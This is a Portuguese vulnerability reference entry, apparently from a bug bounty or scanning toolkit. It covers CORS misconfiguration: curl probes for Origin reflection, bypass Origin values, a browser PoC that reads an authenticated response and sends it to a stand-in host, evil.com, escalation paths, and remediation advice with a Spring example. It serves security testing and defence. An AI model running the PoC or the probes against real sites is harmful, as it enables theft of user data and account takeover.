---
id: cors_misconfiguration
title: "CORS Misconfiguration"
module: "cors"
severity: "HIGH"
cwe_id: "CWE-942"
cwe_title: "Permissive Cross-domain Policy with Untrusted Domains"
cvss_vector: "AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
vrt_id: "broken_authentication_and_session_management.authentication_bypass.other"
---

## Summary
Política de CORS que reflete origens arbitrárias ou confia em subdomínios comprometidos, combinada com credenciais, permite que um site malicioso leia respostas autenticadas e execute ações em nome da vítima.

## Description
O Same-Origin Policy (SOP) impede que `https://evil.com` leia respostas de `https://alvo.com`. O CORS relaxa essa regra por meio de cabeçalhos `Access-Control-Allow-Origin` (ACAO), `Access-Control-Allow-Credentials` (ACAC) e `Access-Control-Allow-Methods/Headers`. A configuração é insegura quando:

- Reflete o header `Origin` sem validação (`ACAO: <Origin>`).
- Usa `Access-Control-Allow-Origin: *` junto de `Allow-Credentials: true` (navegadores bloqueiam, mas proxies e clients não).
- Confia em qualquer subdomínio (`*.alvo.com`) e há subdomain takeover ou XSS em um subdomínio.
- Aceita `Origin: null` (sandboxed iframe, `file://`, data URL) com credenciais.
- Valida a origem por `startsWith`, `endsWith` ou regex fraca, permitindo `https://alvo.com.evil.com`, `https://evilalvo.com` ou `https://alvo.com@evil.com`.
- Permite métodos sensíveis (`PUT`, `DELETE`, `PATCH`) e headers de autenticação para origens não confiáveis.

O impacto depende de o endpoint retornar dados sensíveis e de o navegador enviar cookies (`credentials: include`). Sem credenciais, o atacante ainda pode ler dados públicos ou de APIs com token no header, se conseguir induzir a vítima a executar o fetch.

## Impact
- Leitura cross-origin de dados autenticados: perfil, e-mail, tokens, faturas, mensagens, dados de outros usuários.
- Ações state-changing em nome da vítima (alterar e-mail/senha, criar chaves de API, transferir recursos).
- Account takeover quando o endpoint expõe tokens ou permite troca de credenciais.
- Encadeamento com subdomain takeover/XSS para ampliar o alcance.
- Vazamento de dados entre tenants e violação de LGPD.

## Payloads and Bypasses
```bash
# Reflexão básica de Origin
curl -s -D - https://alvo.com/api/me \
  -H 'Origin: https://evil.com' \
  -H 'Cookie: session=<cookie>' | grep -i 'access-control'

# Origem null
curl -s -D - https://alvo.com/api/me \
  -H 'Origin: null' \
  -H 'Cookie: session=<cookie>'

# Subdomínio controlado / lookalike
curl -s -D - https://alvo.com/api/me -H 'Origin: https://evil.alvo.com'
curl -s -D - https://alvo.com/api/me -H 'Origin: https://alvo.com.evil.com'
curl -s -D - https://alvo.com/api/me -H 'Origin: https://evilalvo.com'
curl -s -D - https://alvo.com/api/me -H 'Origin: https://alvo.com@evil.com'
curl -s -D - https://alvo.com/api/me -H 'Origin: http://alvo.com'

# Preflight
curl -s -X OPTIONS https://alvo.com/api/me \
  -H 'Origin: https://evil.com' \
  -H 'Access-Control-Request-Method: PUT' \
  -H 'Access-Control-Request-Headers: authorization,content-type' -D -
```

PoC em navegador:
```html
<script>
fetch('https://alvo.com/api/me', {
  method: 'GET',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'}
})
.then(r => r.text())
.then(d => fetch('https://evil.com/log?d=' + encodeURIComponent(d)));
</script>
```

Variações de bypass de validação:
```text
Origin: https://alvo.com.evil.com
Origin: https://evil.com/alvo.com
Origin: https://alvo.com%2eevil.com
Origin: https://alvo.com:443.evil.com
Origin: https://alvo.com@evil.com
Origin: https://alvo.com#@evil.com
Origin: null
Origin: file://
Origin: https://sub.alvo.com    # se subdomain takeover/XSS
```

Casos reais e mentalidade de ataque (RWBH): programas como Uber e Yahoo já tiveram políticas que refletiam origens; o atacante procura subdomínios abandonados, `Origin: null` e endpoints que retornam tokens/perfil com credenciais.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `Origin` (header), `callback`, `redirect_uri`, `return_url`.
- **Paths comuns:** `/api/*`, `/api/v1/user`, `/api/me`, `/graphql`, `/oauth/token`, `/admin/api/*`.
- **Sinais:** `ACAO` refletindo `Origin`; `ACAC: true`; `ACAO: *` em endpoint autenticado; `Vary: Origin` ausente; métodos `PUT/DELETE` liberados.

## Escalation Techniques
CORS misconfiguration raramente e o objetivo final -- e o mecanismo que permite ao atacante ler dados cross-origin e pivotar para ataques de maior impacto:

- **Roubo de dados autenticados:** se `Access-Control-Allow-Credentials: true` com origem refletida, uma pagina maliciosa le respostas autenticadas (tokens, PII, dados financeiros) via `fetch` com `credentials: 'include'`. O livro (Bug Bounty Bootcamp, Cap. 19) descreve como o atacante hospeda script que exfiltra a resposta para servidor proprio.
- **Account takeover via dados de sessao:** quando o endpoint retorna tokens de API, chaves de sessao ou dados de reset de senha, o atacante automatiza a coleta e assume contas em massa.
- **Exfiltracao via subdomain takeover:** se a politica confia em `*.example.com` e um subdomain esta abandonado (DNS CNAME dangling), o atacante registra o subdomain no servico de terceiros e usa a confianca CORS para exfiltrar dados. O livro (Cap. 20) detalha como subdomain takeovers permitem contornar SOP via cookies compartilhados e trust CORS.
- **CORS + XSS em subdominio:** o livro (Cap. 19) destaca que "XSS is essentially a full SOP bypass" -- XSS em qualquer subdominio confiavel pela politica CORS permite ler dados autenticados da aplicacao principal, transformando um XSS de baixo impacto em vazamento cross-origin completo.
- **CORS + cache poisoning:** se o servidor nao envia `Vary: Origin`, uma resposta com `ACAO: evil.com` pode ser cacheada por CDN/proxy e servida a outros usuarios, amplificando o impacto de um unico request malicioso.
- **CORS + OAuth token theft:** em fluxos OAuth que retornam tokens via API, a misconfiguracao permite captura do `access_token` diretamente da resposta, sem depender de redirect_uri aberto.
- **Automatizacao e coleta em massa:** o livro (Cap. 19) orienta avaliar: "can you harvest large amounts of user data by automating the exploitation of the SOP bypass?" -- automatizar a exfiltracao de dados de multiplos usuarios amplifica a severidade.

## Hunting Methodology
Processo passo a passo para identificar CORS misconfiguration, baseado no Cap. 19 (Bug Bounty Bootcamp):

1. **Identificar tecnicas de relaxamento de SOP:** ao navegar a aplicacao com proxy (Burp/ZAP), procurar por respostas contendo `Access-Control-Allow-Origin`. O livro orienta verificar tambem se a pagina usa `postMessage()` (inspecionar Event Listeners no DevTools) ou JSONP (`<script src="...?callback=...">`).
2. **Testar reflexao de Origin para CORS:** enviar request com `Origin: https://evil.com` e verificar se `Access-Control-Allow-Origin` retorna `https://evil.com`. Repetir com `Origin: null` -- a forma mais basica de misconfiguracao (Cap. 19: "the most basic misconfiguration involves allowing the null origin").
3. **Testar bypasses de validacao por regex fraca:** o livro explica que regex como `.*example.com.*` e facilmente contornada. Enviar origens que exploram validacao incompleta -- `https://alvo.com.evil.com` (startsWith), `https://evilalvo.com` (endsWith), `https://alvo.com@evil.com` (userinfo), `http://alvo.com` (downgrade de esquema).
4. **Verificar `Access-Control-Allow-Credentials`:** sem este header como `true`, o navegador nao envia cookies, limitando o impacto. Anotar quais endpoints combinam ACAO refletido com ACAC: true -- esses sao os alvos de alto impacto.
5. **Considerar fatores mitigantes:** o livro (Cap. 19) alerta que se o site nao usa cookies para autenticacao (ex.: tokens em headers custom), a misconfiguracao pode nao ser exploravel diretamente.
6. **Montar PoC em navegador:** criar pagina HTML com `fetch()` usando `credentials: 'include'` a partir da origem aceita; exfiltrar a resposta para servidor controlado. O livro enfatiza que reports sem PoC funcional e sem demonstracao de impacto sao mais fracos.
7. **Checar cache poisoning:** verificar se a resposta inclui `Vary: Origin`; se nao, testar se a resposta com ACAO refletido e cacheada por CDN/proxy, amplificando o impacto para todos os visitantes.

## False Positive Indicators
Sinais de que a misconfiguracao CORS detectada pelo scanner **nao e exploravel**:

- **`ACAO: *` sem credenciais:** o livro (Cap. 19) explica que `Access-Control-Allow-Origin: *` nao e exploravel porque "CORS doesn't allow credentials [...] to be sent with requests to these pages [...] no private information can be accessed." Navegadores bloqueiam cookies e headers de autenticacao nesse cenario.
- **Endpoint sem dados sensiveis:** se o endpoint retorna apenas dados publicos (lista de paises, configuracao de tema), a reflexao de Origin nao tem impacto. O livro alerta: "if a publicly readable page is served with a null ACAO header, it would not cause damage."
- **Reflexao de Origin sem `ACAC: true`:** o servidor reflete o `Origin` no `ACAO` mas nao envia `Allow-Credentials: true` -- o navegador nao incluira cookies, limitando o impacto a dados acessiveis sem autenticacao.
- **Autenticacao por token em header (nao cookie):** se o site usa `Authorization: Bearer <token>` ao inves de cookies, a misconfiguracao CORS nao permite ao atacante enviar o token automaticamente.
- **Preflight bloqueado:** o servidor responde ao `OPTIONS` com `403` ou sem headers CORS para origens nao confiaveis, bloqueando requests com headers custom ou metodos nao simples.
- **Ambiente de staging/dev:** a misconfiguracao existe apenas em ambientes nao produtivos sem dados reais e sem acesso de usuarios finais.
## Recommendation
1. Usar allowlist explícita de origens exatas (esquema + host + porta), nunca reflexão crua ou regex permissiva.
2. Não combinar `Access-Control-Allow-Origin: *` com credenciais; para APIs públicas sem credenciais, `*` é aceitável.
3. Rejeitar `Origin: null` e origens desconhecidas com resposta sem cabeçalhos CORS.
4. Validar a origem no servidor após parse completo da URL, comparando host exato; não usar `startsWith`/`endsWith`.
5. Enviar `Vary: Origin` para evitar cache poisoning de respostas CORS.
6. Limitar métodos e headers ao necessário; não liberar `Authorization` para origens não confiáveis.
7. Preferir tokens no header `Authorization` a cookies para APIs cross-origin; se usar cookies, exigir `SameSite=Lax/Strict` e CSRF token.
8. Exemplo Spring:
```java
@Bean
CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration c = new CorsConfiguration();
    c.setAllowedOrigins(List.of("https://app.alvo.com", "https://admin.alvo.com"));
    c.setAllowedMethods(List.of("GET", "POST"));
    c.setAllowedHeaders(List.of("Content-Type", "Authorization"));
    c.setAllowCredentials(true);
    UrlBasedCorsConfigurationSource s = new UrlBasedCorsConfigurationSource();
    s.registerCorsConfiguration("/api/**", c);
    return s;
}
```
9. Monitorar subdomínios e remover registros DNS órfãos para evitar bypass via subdomain takeover.

